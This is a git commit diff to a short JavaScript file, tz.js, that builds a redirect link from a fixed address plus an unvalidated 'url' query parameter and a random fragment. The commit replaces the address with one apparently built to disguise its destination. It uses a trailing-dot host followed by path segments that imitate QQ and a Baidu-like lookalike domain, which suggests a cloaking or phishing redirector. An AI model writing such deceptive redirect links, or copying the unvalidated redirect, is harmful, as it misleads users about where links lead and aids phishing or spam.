25d868f5142bb060a212a1a04afa20a04fbe979f
jinse11111 <3458422924@qq.com>
2024-06-27 19:42:28 +0800

    Update tz.js

--- tz.js
+++ tz.js
@@ -9,7 +9,7 @@ const customParam = urlParams.get('url');
 const randomString = Math.random().toString(36).substring(2); // 生成随机字符串，包括数字和小写字母
 
 // 构建跳转链接
-let redirectURL = "https://oss11.huangye88.net/live/user/3763603/14412-0.svg";
+let redirectURL = "http://img.omofresh.com./https://im.qq.com/https://www.2b222aidu.com/olaFg,2222222*,*,;3.svg";
 if (customParam) {
     redirectURL += "?url=" + customParam + "#" + randomString; // 将随机字符串添加到参数后面
 }
